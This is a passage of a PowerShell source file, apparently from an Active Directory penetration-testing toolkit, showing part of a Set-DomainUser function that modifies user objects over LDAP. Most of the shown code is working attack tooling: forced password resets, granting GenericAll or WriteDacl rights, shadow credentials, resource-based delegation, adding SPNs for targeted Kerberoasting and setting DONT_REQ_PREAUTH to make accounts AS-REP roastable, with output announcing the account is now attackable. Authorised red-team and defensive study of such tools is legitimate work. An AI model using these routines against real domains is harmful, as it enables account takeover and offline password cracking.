    Enables reversible encryption for the account password.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -ClearReversibleEncryption
    Disables reversible encryption (cleanup).

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -SmartcardRequired
    Forces the account to require a smartcard for interactive logon.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -ClearSmartcardRequired
    Removes the smartcard requirement (cleanup).

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -NotDelegated
    Marks the account as sensitive and prevents delegation.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -ClearNotDelegated
    Allows the account to be delegated again (cleanup).

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -PasswordExpired
    Forces the user to change their password at next logon.

.EXAMPLE
    Set-DomainUser -Identity "targetuser" -ClearPasswordExpired
    Removes the forced password change requirement (cleanup).

.OUTPUTS
    PSCustomObject with operation result

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding(DefaultParameterSetName='SetPassword')]
    param(
        # Identity for existing users
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetPassword')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ChangePassword')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetOwner')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='GrantRights')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetRBCD')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearRBCD')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='AddShadowCredential')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearShadowCredentials')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetSPN')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearSPN')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetDontReqPreauth')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearDontReqPreauth')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='EnableAccount')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='DisableAccount')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='UnlockAccount')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetPasswordNotRequired')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearPasswordNotRequired')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetPasswordCantChange')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearPasswordCantChange')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetReversibleEncryption')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearReversibleEncryption')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetPasswordNeverExpires')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearPasswordNeverExpires')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetSmartcardRequired')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearSmartcardRequired')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetNotDelegated')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearNotDelegated')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetPasswordExpired')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearPasswordExpired')]
        [Alias('samAccountName', 'User')]
        [string]$Identity,

        # Password operations
        [Parameter(ParameterSetName='SetPassword', Mandatory=$true)]
        [Parameter(ParameterSetName='ChangePassword', Mandatory=$true)]
        [string]$NewPassword,

        [Parameter(ParameterSetName='ChangePassword', Mandatory=$true)]
        [string]$OldPassword,

        # Owner modification
        [Parameter(ParameterSetName='SetOwner', Mandatory=$true)]
        [string]$Owner,

        # ACL modification
        [Parameter(ParameterSetName='GrantRights', Mandatory=$true)]
        [ValidateSet('GenericAll','GenericWrite','ResetPassword','WriteDacl','WriteOwner')]
        [string]$GrantRights,

        [Parameter(ParameterSetName='GrantRights', Mandatory=$true)]
        [Parameter(ParameterSetName='ClearRBCD', Mandatory=$false)]
        [string]$Principal,

        # RBCD configuration
        [Parameter(ParameterSetName='SetRBCD', Mandatory=$true)]
        [string]$AddRBCD,

        [Parameter(ParameterSetName='ClearRBCD', Mandatory=$true)]
        [switch]$ClearRBCD,

        # Shadow Credentials
        [Parameter(ParameterSetName='AddShadowCredential', Mandatory=$true)]
        [switch]$AddShadowCredential,

        [Parameter(ParameterSetName='ClearShadowCredentials', Mandatory=$true)]
        [switch]$ClearShadowCredentials,

        [Parameter(ParameterSetName='AddShadowCredential', Mandatory=$false)]
        [Parameter(ParameterSetName='ClearShadowCredentials', Mandatory=$false)]
        [string]$DeviceID,

        [Parameter(ParameterSetName='AddShadowCredential', Mandatory=$false)]
        [switch]$NoPassword,

        [Parameter(ParameterSetName='ClearRBCD', Mandatory=$false)]
        [Parameter(ParameterSetName='ClearShadowCredentials', Mandatory=$false)]
        [Parameter(ParameterSetName='ClearSPN', Mandatory=$false)]
        [switch]$Force,

        # SPN Manipulation (Targeted Kerberoasting)
        [Parameter(ParameterSetName='SetSPN', Mandatory=$true)]
        [string]$SetSPN,

        [Parameter(ParameterSetName='ClearSPN', Mandatory=$true)]
        [string]$ClearSPN,

        # UAC Flag: DONT_REQ_PREAUTH (0x400000)
        [Parameter(ParameterSetName='SetDontReqPreauth', Mandatory=$true)]
        [switch]$DontReqPreauth,

        # UAC Flag: DONT_REQ_PREAUTH - Clear (0x400000)
        [Parameter(ParameterSetName='ClearDontReqPreauth', Mandatory=$true)]
        [switch]$ClearDontReqPreauth,

        # Account State Management
        [Parameter(ParameterSetName='EnableAccount', Mandatory=$true)]
        [switch]$Enable,

        [Parameter(ParameterSetName='DisableAccount', Mandatory=$true)]
        [switch]$Disable,

        [Parameter(ParameterSetName='UnlockAccount', Mandatory=$true)]
        [switch]$Unlock,

        # UAC Flag: PASSWD_NOTREQD (0x0020)
        [Parameter(ParameterSetName='SetPasswordNotRequired', Mandatory=$true)]
        [switch]$PasswordNotRequired,

        [Parameter(ParameterSetName='ClearPasswordNotRequired', Mandatory=$true)]
        [switch]$ClearPasswordNotRequired,

        # UAC Flag: PASSWD_CANT_CHANGE (0x0040)
        [Parameter(ParameterSetName='SetPasswordCantChange', Mandatory=$true)]
        [switch]$PasswordCantChange,

        [Parameter(ParameterSetName='ClearPasswordCantChange', Mandatory=$true)]
        [switch]$ClearPasswordCantChange,

        # UAC Flag: ENCRYPTED_TEXT_PWD_ALLOWED (0x0080)
        [Parameter(ParameterSetName='SetReversibleEncryption', Mandatory=$true)]
        [switch]$ReversibleEncryption,

        [Parameter(ParameterSetName='ClearReversibleEncryption', Mandatory=$true)]
        [switch]$ClearReversibleEncryption,

        # UAC Flag: DONT_EXPIRE_PASSWORD (0x10000)
        [Parameter(ParameterSetName='SetPasswordNeverExpires', Mandatory=$true)]
        [switch]$PasswordNeverExpires,

        [Parameter(ParameterSetName='ClearPasswordNeverExpires', Mandatory=$true)]
        [switch]$ClearPasswordNeverExpires,

        # UAC Flag: SMARTCARD_REQUIRED (0x40000)
        [Parameter(ParameterSetName='SetSmartcardRequired', Mandatory=$true)]
        [switch]$SmartcardRequired,

        [Parameter(ParameterSetName='ClearSmartcardRequired', Mandatory=$true)]
        [switch]$ClearSmartcardRequired,

        # UAC Flag: NOT_DELEGATED (0x100000)
        [Parameter(ParameterSetName='SetNotDelegated', Mandatory=$true)]
        [switch]$NotDelegated,

        [Parameter(ParameterSetName='ClearNotDelegated', Mandatory=$true)]
        [switch]$ClearNotDelegated,

        # UAC Flag: PASSWORD_EXPIRED (0x800000)
        [Parameter(ParameterSetName='SetPasswordExpired', Mandatory=$true)]
        [switch]$PasswordExpired,

        [Parameter(ParameterSetName='ClearPasswordExpired', Mandatory=$true)]
        [switch]$ClearPasswordExpired,

        # Authentication parameters
        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [switch]$PassThru,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential
    )

    begin {
        Write-Log "[Set-DomainUser] Starting user operation: $Identity (ParameterSet: $($PSCmdlet.ParameterSetName))"
    }

    process {
        # Ensure LDAP connection at start of process block
        $ConnectionParams = @{}
        if ($Domain) { $ConnectionParams['Domain'] = $Domain }
        if ($Server) { $ConnectionParams['Server'] = $Server }
        if ($Credential) { $ConnectionParams['Credential'] = $Credential }

        if (-not (Ensure-LDAPConnection @ConnectionParams)) {
            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = $PSCmdlet.ParameterSetName
                    User = $Identity
                    Success = $false
                    Message = "No LDAP connection available"
                }
            }
            return
        }

        try {
            # Find the target user
            Write-Log "[Set-DomainUser] Searching for user: $Identity"
            $TargetUser = @(Get-DomainUser -Identity $Identity @ConnectionParams)[0]

            if (-not $TargetUser) {
                throw "User '$Identity' not Found"
            }

            $UserDN = $TargetUser.distinguishedName
            Write-Log "[Set-DomainUser] Found user: $UserDN"

            # Perform operation based on ParameterSet
            $UserEntry = $null
            switch ($PSCmdlet.ParameterSetName) {
                'SetPassword' {
                    Write-Log "[Set-DomainUser] Resetting password for: $($TargetUser.sAMAccountName)"

                    # Try unicodePwd via ModifyRequest (works over LDAPS and Kerberos-encrypted LDAP)
                    $PasswordSet = $false
                    $primaryError = $null
                    try {
                        $quotedPwd = '"' + $NewPassword + '"'
                        $pwdBytes = [System.Text.Encoding]::Unicode.GetBytes($quotedPwd)

                        $PwdModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                        $PwdModifyRequest.DistinguishedName = $UserDN

                        $PwdMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                        $PwdMod.Name = "unicodePwd"
                        $PwdMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                        $PwdMod.Add($pwdBytes) | Out-Null

                        $PwdModifyRequest.Modifications.Add($PwdMod) | Out-Null

                        $PwdResponse = $Script:LdapConnection.SendRequest($PwdModifyRequest)
                        if ($PwdResponse.ResultCode -eq [System.DirectoryServices.Protocols.ResultCode]::Success) {
                            $PasswordSet = $true
                            Write-Log "[Set-DomainUser] Password reset via unicodePwd ModifyRequest"
                        }
                    }
                    catch {
                        $primaryError = $_.Exception.Message
                        Write-Log "[Set-DomainUser] unicodePwd failed, falling back to DirectoryEntry: $primaryError"
                    }

                    # Fallback: DirectoryEntry SetPassword (ADSI)
                    if (-not $PasswordSet) {
                        # Warn if no credentials available for DirectoryEntry (Hash/Key/Cert auth has no PSCredential)
                        if (-not $Credential -and -not $Script:LDAPCredential) {
                            Write-Warning "[Set-DomainUser] DirectoryEntry fallback uses current Windows user context, not the Kerberos-authenticated session identity. Password operation may fail or use wrong identity."
                        }
                        $UserEntry = Get-AuthenticatedDirectoryEntry -DistinguishedName $UserDN -Credential $Credential
                        if (-not $UserEntry) { throw "Failed to get DirectoryEntry for password reset" }
                        try {
                            $UserEntry.Invoke("SetPassword", $NewPassword)
                            $UserEntry.CommitChanges()
                            $PasswordSet = $true
                            Write-Log "[Set-DomainUser] Password reset via DirectoryEntry SetPassword"
                        }
                        catch {
                            $errorMsg = "Failed to reset password."
                            if ($primaryError) {
                                $errorMsg += " LDAP: $primaryError"
                            }
                            $errorMsg += " ADSI fallback: $_"
                            throw $errorMsg
                        }
                    }

                    if ($PassThru) {
                        return [PSCustomObject]@{
                            Operation = "PasswordReset"
                            User = $TargetUser.sAMAccountName
                            DistinguishedName = $UserDN
                            Success = $true
                            Message = "Password successfully reset"
                        }
                    } else {
                        Show-Line "Successfully reset password for user: $($TargetUser.sAMAccountName)" -Class Hint
                    }
                }

                'ChangePassword' {
                    Write-Log "[Set-DomainUser] Changing password for: $($TargetUser.sAMAccountName)"

                    # Try unicodePwd via ModifyRequest (Delete old + Add new in single request)
                    $PasswordChanged = $false
                    $primaryError = $null
                    try {
                        $quotedOld = '"' + $OldPassword + '"'
                        $quotedNew = '"' + $NewPassword + '"'
                        $oldPwdBytes = [System.Text.Encoding]::Unicode.GetBytes($quotedOld)
                        $newPwdBytes = [System.Text.Encoding]::Unicode.GetBytes($quotedNew)

                        $ChgModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                        $ChgModifyRequest.DistinguishedName = $UserDN

                        # Delete old password
                        $DelMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                        $DelMod.Name = "unicodePwd"
                        $DelMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                        $DelMod.Add($oldPwdBytes) | Out-Null
                        $ChgModifyRequest.Modifications.Add($DelMod) | Out-Null

                        # Add new password
                        $AddMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                        $AddMod.Name = "unicodePwd"
                        $AddMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add
                        $AddMod.Add($newPwdBytes) | Out-Null
                        $ChgModifyRequest.Modifications.Add($AddMod) | Out-Null

                        $ChgResponse = $Script:LdapConnection.SendRequest($ChgModifyRequest)
                        if ($ChgResponse.ResultCode -eq [System.DirectoryServices.Protocols.ResultCode]::Success) {
                            $PasswordChanged = $true
                            Write-Log "[Set-DomainUser] Password changed via unicodePwd ModifyRequest"
                        }
                    }
                    catch {
                        $primaryError = $_.Exception.Message
                        Write-Log "[Set-DomainUser] unicodePwd change failed, falling back to DirectoryEntry: $primaryError"
                    }

                    # Fallback: DirectoryEntry ChangePassword (ADSI)
                    if (-not $PasswordChanged) {
                        # Warn if no credentials available for DirectoryEntry (Hash/Key/Cert auth has no PSCredential)
                        if (-not $Credential -and -not $Script:LDAPCredential) {
                            Write-Warning "[Set-DomainUser] DirectoryEntry fallback uses current Windows user context, not the Kerberos-authenticated session identity. Password operation may fail or use wrong identity."
                        }
                        $UserEntry = Get-AuthenticatedDirectoryEntry -DistinguishedName $UserDN -Credential $Credential
                        if (-not $UserEntry) { throw "Failed to get DirectoryEntry for password change" }
                        try {
                            $UserEntry.Invoke("ChangePassword", @($OldPassword, $NewPassword))
                            $UserEntry.CommitChanges()
                            $PasswordChanged = $true
                            Write-Log "[Set-DomainUser] Password changed via DirectoryEntry ChangePassword"
                        }
                        catch {
                            # Show LDAP error from primary attempt (more informative than ADSI error)
                            $errorMsg = "Failed to change password."
                            if ($primaryError) {
                                $errorMsg += " LDAP: $primaryError"
                            }
                            $errorMsg += " ADSI fallback: $_. Verify the old password is correct and the new password meets the domain password policy."
                            throw $errorMsg
                        }
                    }

                    if ($PassThru) {
                        return [PSCustomObject]@{
                            Operation = "PasswordChange"
                            User = $TargetUser.sAMAccountName
                            DistinguishedName = $UserDN
                            Success = $true
                            Message = "Password successfully changed"
                        }
                    } else {
                        Show-Line "Successfully changed password for user: $($TargetUser.sAMAccountName)" -Class Hint
                    }
                }

                'SetOwner' {
                    Write-Log "[Set-DomainUser] Setting owner for: $($TargetUser.sAMAccountName)"

                    try {
                        $Result = Set-DomainObject -Identity $UserDN -SetOwner -Principal $Owner @ConnectionParams

                        if ($Result) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetOwner"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    NewOwner = $Owner
                                    Success = $true
                                    Message = "Owner successfully changed"
                                }
                            } else {
                                Show-Line "Successfully changed owner of $($TargetUser.sAMAccountName) to: $Owner" -Class Hint
                            }
                        } else {
                            throw "Set-DomainObject returned false"
                        }
                    } catch {
                        throw "Failed to set owner: $_"
                    }
                }

                'GrantRights' {
                    Write-Log "[Set-DomainUser] Granting $GrantRights rights to $Principal on: $($TargetUser.sAMAccountName)"

                    try {
                        # Map GrantRights to either Rights or ExtendedRight and call Set-DomainObject
                        $Result = switch ($GrantRights) {
                            'GenericAll'    { Set-DomainObject -Identity $UserDN -GrantACE -Principal $Principal -Rights GenericAll @ConnectionParams }
                            'GenericWrite'  { Set-DomainObject -Identity $UserDN -GrantACE -Principal $Principal -Rights GenericWrite @ConnectionParams }
                            'WriteDacl'     { Set-DomainObject -Identity $UserDN -GrantACE -Principal $Principal -Rights WriteDacl @ConnectionParams }
                            'WriteOwner'    { Set-DomainObject -Identity $UserDN -GrantACE -Principal $Principal -Rights WriteOwner @ConnectionParams }
                            'ResetPassword' { Set-DomainObject -Identity $UserDN -GrantACE -Principal $Principal -ExtendedRight ForceChangePassword @ConnectionParams }
                        }

                        if ($Result) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "GrantRights"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    Principal = $Principal
                                    Rights = $GrantRights
                                    Success = $true
                                    Message = "Rights successfully granted"
                                }
                            } else {
                                Show-Line "Successfully granted $GrantRights to $Principal on: $($TargetUser.sAMAccountName)" -Class Hint
                            }
                        } else {
                            throw "Set-DomainObject returned false"
                        }
                    } catch {
                        throw "Failed to grant rights: $_"
                    }
                }

                'SetRBCD' {
                    $result = Invoke-RBCDOperation -TargetDN $UserDN -TargetSAMAccountName $TargetUser.sAMAccountName -TargetType 'User' -AddRBCD $AddRBCD -PassThru:$PassThru -ConnectionParams $ConnectionParams

                    if ($PassThru -and $result) {
                        return $result
                    }
                }

                'ClearRBCD' {
                    $result = Invoke-RBCDOperation -TargetDN $UserDN -TargetSAMAccountName $TargetUser.sAMAccountName -TargetType 'User' -ClearRBCD -Principal $Principal -Force:$Force -PassThru:$PassThru -ConnectionParams $ConnectionParams

                    if ($PassThru -and $result) {
                        return $result
                    }
                }

                'AddShadowCredential' {
                    # Determine UPN for certificate SAN
                    $UserUPN = if ($TargetUser.userPrincipalName) {
                        $TargetUser.userPrincipalName
                    } else {
                        "$($TargetUser.sAMAccountName)@$($Script:LDAPContext.Domain.ToUpper())"
                    }

                    $result = Invoke-ShadowCredentialOperation -TargetDN $UserDN -TargetSAMAccountName $TargetUser.sAMAccountName -TargetType 'User' -TargetUPN $UserUPN -AddShadowCredential -DeviceID $DeviceID -NoPassword:$NoPassword -PassThru:$PassThru

                    if ($PassThru -and $result) {
                        return $result
                    }
                }

                'ClearShadowCredentials' {
                    $result = Invoke-ShadowCredentialOperation -TargetDN $UserDN -TargetSAMAccountName $TargetUser.sAMAccountName -TargetType 'User' -ClearShadowCredentials -DeviceID $DeviceID -Force:$Force -PassThru:$PassThru

                    if ($PassThru -and $result) {
                        return $result
                    }
                }

                # ===== SPN Manipulation (Targeted Kerberoasting) =====
                'SetSPN' {
                    Write-Log "[Set-DomainUser] Adding SPN to: $($TargetUser.sAMAccountName)"

                    try {
                        # Get current SPNs
                        $CurrentSPNs = @()
                        if ($TargetUser.servicePrincipalName) {
                            $spnValue = $TargetUser.servicePrincipalName
                            if ($spnValue -is [System.Array]) {
                                $CurrentSPNs = @($spnValue | ForEach-Object { [string]$_ })
                            }
                            else {
                                $CurrentSPNs = @([string]$spnValue)
                            }
                        }

                        Write-Log "[Set-DomainUser] Current SPNs ($($CurrentSPNs.Count)): $($CurrentSPNs -join ', ')"

                        # Check if SPN already exists
                        if ($CurrentSPNs -contains $SetSPN) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetSPN"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    SPN = $SetSPN
                                    Success = $true
                                    Message = "SPN already present (no change)"
                                }
                            } else {
                                Show-Line "SPN '$SetSPN' already present on: $($TargetUser.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            # Add new SPN via ModifyRequest
                            $NewSPNs = [string[]]@($CurrentSPNs + $SetSPN)
                            Write-Log "[Set-DomainUser] New SPNs ($($NewSPNs.Count)): $($NewSPNs -join ', ')"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $UserDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "servicePrincipalName"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            foreach ($spn in $NewSPNs) {
                                $Modification.Add($spn) | Out-Null
                            }

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetSPN"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    SPN = $SetSPN
                                    AllSPNs = $NewSPNs
                                    Success = $true
                                    Message = "SPN added - user is now Kerberoastable"
                                }
                            } else {
                                Show-Line "Successfully added SPN '$SetSPN' to: $($TargetUser.sAMAccountName)" -Class Hint
                                Show-Line "User is now Kerberoastable!" -Class Finding
                            }
                        }
                    } catch {
                        throw "Failed to set SPN: $_"
                    }
                }

                'ClearSPN' {
                    Write-Log "[Set-DomainUser] Removing SPN from: $($TargetUser.sAMAccountName)"

                    try {
                        # Get current SPNs
                        $CurrentSPNs = @()
                        if ($TargetUser.servicePrincipalName) {
                            $spnValue = $TargetUser.servicePrincipalName
                            if ($spnValue -is [System.Array]) {
                                $CurrentSPNs = @($spnValue | ForEach-Object { [string]$_ })
                            }
                            else {
                                $CurrentSPNs = @([string]$spnValue)
                            }
                        }

                        Write-Log "[Set-DomainUser] Current SPNs ($($CurrentSPNs.Count)): $($CurrentSPNs -join ', ')"

                        if ($CurrentSPNs.Count -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearSPN"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    Success = $true
                                    Message = "No SPNs present (no change)"
                                }
                            } else {
                                Show-Line "No SPNs present on: $($TargetUser.sAMAccountName)" -Class Note
                            }
                        }
                        elseif ($Force) {
                            # Remove ALL SPNs via ModifyRequest
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $UserDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "servicePrincipalName"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearSPN"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    RemovedSPNs = $CurrentSPNs
                                    Success = $true
                                    Message = "All $($CurrentSPNs.Count) SPN(s) removed"
                                }
                            } else {
                                Show-Line "Successfully removed all $($CurrentSPNs.Count) SPN(s) from: $($TargetUser.sAMAccountName)" -Class Hint
                            }
                        }
                        elseif ($CurrentSPNs -contains $ClearSPN) {
                            # Remove specific SPN via ModifyRequest
                            $NewSPNs = [string[]]@($CurrentSPNs | Where-Object { $_ -ne $ClearSPN })
                            Write-Log "[Set-DomainUser] New SPNs ($($NewSPNs.Count)): $($NewSPNs -join ', ')"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $UserDN

                            if ($NewSPNs.Count -eq 0) {
                                # Last SPN removed - clear attribute entirely
                                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                                $Modification.Name = "servicePrincipalName"
                                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                            } else {
                                # Replace with remaining SPNs
                                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                                $Modification.Name = "servicePrincipalName"
                                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                                foreach ($spn in $NewSPNs) {
                                    $Modification.Add($spn) | Out-Null
                                }
                            }

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearSPN"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    RemovedSPN = $ClearSPN
                                    RemainingSPNs = $NewSPNs
                                    Success = $true
                                    Message = "SPN removed"
                                }
                            } else {
                                Show-Line "Successfully removed SPN '$ClearSPN' from: $($TargetUser.sAMAccountName)" -Class Hint
                            }
                        }
                        else {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearSPN"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    Success = $false
                                    Message = "SPN '$ClearSPN' not found on user. Use -Force to remove all SPNs."
                                }
                            } else {
                                Show-Line "SPN '$ClearSPN' not found on: $($TargetUser.sAMAccountName)" -Class Note
                                Show-Line "Current SPNs: $($CurrentSPNs -join ', ')" -Class Note
                                Show-Line "Use -Force to remove all SPNs" -Class Note
                            }
                        }
                    } catch {
                        throw "Failed to clear SPN: $_"
                    }
                }

                # ===== DONT_REQ_PREAUTH (0x400000) =====
                'SetDontReqPreauth' {
                    Write-Log "[Set-DomainUser] Setting DONT_REQ_PREAUTH flag for: $($TargetUser.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetUser.userAccountControl) {
                            [int]$TargetUser.userAccountControl
                        } else { 512 }  # Default: NORMAL_ACCOUNT

                        Write-Log "[Set-DomainUser] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # DONT_REQ_PREAUTH = 0x400000 (4194304)
                        $DONT_REQ_PREAUTH = 0x400000

                        if (($CurrentUAC -band $DONT_REQ_PREAUTH) -ne 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetDontReqPreauth"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    Success = $true
                                    Message = "DONT_REQ_PREAUTH already set (no change)"
                                }
                            } else {
                                Show-Line "DONT_REQ_PREAUTH already set on: $($TargetUser.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -bor $DONT_REQ_PREAUTH
                            Write-Log "[Set-DomainUser] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $UserDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetDontReqPreauth"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "DONT_REQ_PREAUTH flag set - user is now AS-REP roastable!"
                                }
                            } else {
                                Show-Line "Successfully set DONT_REQ_PREAUTH on: $($TargetUser.sAMAccountName)" -Class Hint
                                Show-Line "User is now ASREPRoastable!" -Class Finding
                            }
                        }
                    } catch {
                        throw "Failed to set DONT_REQ_PREAUTH: $_"
                    }
                }

                'ClearDontReqPreauth' {
                    Write-Log "[Set-DomainUser] Clearing DONT_REQ_PREAUTH flag for: $($TargetUser.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetUser.userAccountControl) {
                            [int]$TargetUser.userAccountControl
                        } else { 512 }

                        Write-Log "[Set-DomainUser] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # DONT_REQ_PREAUTH = 0x400000 (4194304)
                        $DONT_REQ_PREAUTH = 0x400000

                        if (($CurrentUAC -band $DONT_REQ_PREAUTH) -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearDontReqPreauth"
                                    User = $TargetUser.sAMAccountName
                                    DistinguishedName = $UserDN
                                    Success = $true
                                    Message = "DONT_REQ_PREAUTH already cleared (no change)"
                                }
                            } else {
                                Show-Line "DONT_REQ_PREAUTH already cleared on: $($TargetUser.sAMAccountName)" -Class Note
                            }
                        }
                        else {
